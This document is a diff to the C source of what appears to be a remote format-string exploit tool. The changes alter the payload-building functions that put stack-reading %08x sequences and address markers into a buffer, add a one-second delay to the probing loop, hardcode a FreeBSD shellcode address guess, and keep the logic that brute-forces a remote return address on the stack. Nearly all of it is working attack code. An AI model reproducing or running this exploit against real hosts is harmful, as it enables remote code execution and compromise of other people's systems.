@@ -213,6 +213,8 @@ find_shellcode_addr (char *buffer, int maxlen, int align, int stack_height, long
 		strncat (buffer, "S", maxlen);
 	}
 
+	strncat (buffer, "BEEF", maxlen);
+
 	ptr = &buffer[strlen (buffer)];
 	/* ADDR */
 	memcpy (ptr, &addr, sizeof (addr));
@@ -227,10 +229,10 @@ find_shellcode_addr (char *buffer, int maxlen, int align, int stack_height, long
 	 * <addr-3>AAAA|<eating stack..>|%n%xu%n%xu%n%xu%n|
 	 */
 
-	strncat (buffer, "BBBBADDRCCCCADDRDDDD", maxlen);
+	strncat (buffer, "BEEFADDRBEEFADDRBEEFADDR.", maxlen);
 
 	for (i = 0; i < stack_height; i++) {
-		strncat (buffer, ".%08x", maxlen);
+		strncat (buffer, "%08x", maxlen);
 	}
 
 	strncat (buffer, "|%s|", maxlen);
@@ -239,7 +241,7 @@ find_shellcode_addr (char *buffer, int maxlen, int align, int stack_height, long
 
 	fill_size = 1022 - strlen (buffer);
 	for (i = 0; i < (fill_size/4); i++) {
-		strncat (buffer, "AAAA", maxlen);
+		strncat (buffer, "CCCC", maxlen);
 	}	
 
 	// Return the numbers of bytes we have to store the nops+shellcode
@@ -257,10 +259,10 @@ find_stack_distance (char *buffer, int maxlen, int align, int stack_height)
 		strncat (buffer, "S", maxlen);
 	}
 
-	strncat (buffer, "AAAA", maxlen); 
+	strncat (buffer, "BEEFAAAABEEFADDRBEEFADDRBEEFADDR.", maxlen); 
 
 	for (i = 0; i < stack_height; i++) {
-		strncat (buffer, ".%08x", maxlen);
+		strncat (buffer, "%08x", maxlen);
 	}
 
 	strncat (buffer, "|%08x|", maxlen);
@@ -396,6 +398,8 @@ main (int argc, char ** argv)
 
 	found = 0;
 	do {
+		sleep (1);
+
 		memset (buffer, 0, sizeof (buffer));
 		memset (result, 0, sizeof (result));
 
@@ -411,7 +415,7 @@ main (int argc, char ** argv)
 		printf (">> %s\n", host);
 
 		
-		ptr = strstr (result, "AAAA.");
+		ptr = strstr (result, "BEEFAAAA");
 		if (ptr == NULL) {
 			stack_height++;
 			continue;
@@ -451,6 +455,12 @@ main (int argc, char ** argv)
 	}
        	
 
+	if (strstr (result, "FreeBSD")) {
+		//XXX: find the correct value for FreeBSD
+		// For linux it is 0xbfffxxxx
+		expect_shellcode_addr = 0xb5ffffff;
+	}
+
 	shellcode_addr_found = 0;
 	total_shellcode_addr_retries = 0;
 	found = 0;
@@ -483,9 +493,9 @@ main (int argc, char ** argv)
 			print_result_as_ascii (result);
 			printf ("\n");
 
-			if ((ptr = strstr (result, "|AAA"))) {
+			if ((ptr = strstr (result, "|CCC"))) {
 								
-				endPtr = strstr (ptr, "AAA|");
+				endPtr = strstr (ptr, "CCC|");
 				if (!endPtr) {
 					//XXX
 					expect_shellcode_addr += step;
@@ -530,7 +540,7 @@ main (int argc, char ** argv)
 
 	log_result ("Host address %s stack_height=%d align=%d shellcode address=0x%08x\n", host, stack_height, align, expect_shellcode_addr);
 
-	printf ("Brute forcing remote return address into stack...\n");
+	printf (">> Brute forcing remote return address into stack...\n");
 
 	
 	return (0);
